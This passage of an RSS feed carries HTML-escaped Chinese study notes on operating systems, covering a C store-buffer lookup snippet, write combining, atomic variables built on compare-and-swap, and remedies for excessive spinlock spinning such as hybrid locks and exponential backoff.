&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;store_buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;].&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;address&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;addr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;store_buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;].&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;valid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              &lt;span class=&#34;c1&#34;&gt;// 找到匹配的待写入数据，直接返回
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;              &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;store_buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;].&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;c1&#34;&gt;// 2. Store Buffer中没有，从缓存/内存读取
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;      &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;cache_read&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;addr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;即在Store Buffer中寻找所需数据，如果没有再从缓存/内存读取&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;store-buffer的性能优化&#34;&gt;Store Buffer的性能优化
&lt;/h3&gt;&lt;h4 id=&#34;写合并&#34;&gt;写合并
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;在连续的地址上写入内容时会合并到同一个Entity中&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;store-buffer的管理策略&#34;&gt;Store Buffer的管理策略
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;阻塞策略&lt;/li&gt;
&lt;li&gt;强制排空策略&lt;/li&gt;
&lt;li&gt;优先级策略&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;原子变量&#34;&gt;原子变量
&lt;/h2&gt;&lt;h3 id=&#34;概念&#34;&gt;概念：
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;通常，像比较交换（compare-and-swap）这样的指令被用作构建其他同步工具的基础构件&lt;/li&gt;
&lt;li&gt;其中一个工具是原子变量，它为基本数据类型提供原子的（不可中断的）更新操作&lt;/li&gt;
&lt;li&gt;例如，对原子变量sequence的increment()操作确保sequence在没有中断的情况下被递增&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;过度自旋too-much-spinning&#34;&gt;过度自旋(Too Much Spinning)
&lt;/h2&gt;&lt;h3 id=&#34;概念-1&#34;&gt;概念
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;自旋：当线程无法获得锁时，不进入睡眠状态，而是持续循环检查锁状态，直到获得锁为止&lt;/li&gt;
&lt;li&gt;过度自旋：在不合适的场景下使用自旋锁，导致大量CPU时间被浪费在无意义的等待上&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;解决方法&#34;&gt;解决方法
&lt;/h3&gt;&lt;h4 id=&#34;混合锁&#34;&gt;混合锁
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;核心思想：“先试试，不行就休息”&lt;/li&gt;
&lt;li&gt;设计方式：
&lt;ul&gt;
&lt;li&gt;短暂自旋，快速检查锁状态&lt;/li&gt;
&lt;li&gt;如果自旋失败，进入睡眠等待&lt;/li&gt;
&lt;li&gt;被唤醒时：重新尝试获取锁&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;指数退避&#34;&gt;指数退避
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;核心思想：“越等越慢”&lt;/li&gt;
&lt;li&gt;设计方式：
&lt;ul&gt;
&lt;li&gt;每次检查后检查间隔增加&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;自适应自旋&#34;&gt;自适应自旋
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;核心思想：“学习型只能等待”&lt;/li&gt;
&lt;li&gt;设计方式：
&lt;ul&gt;
&lt;li&gt;根据历史学习预测检查间隔时间&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        
    </channel>
</rss>
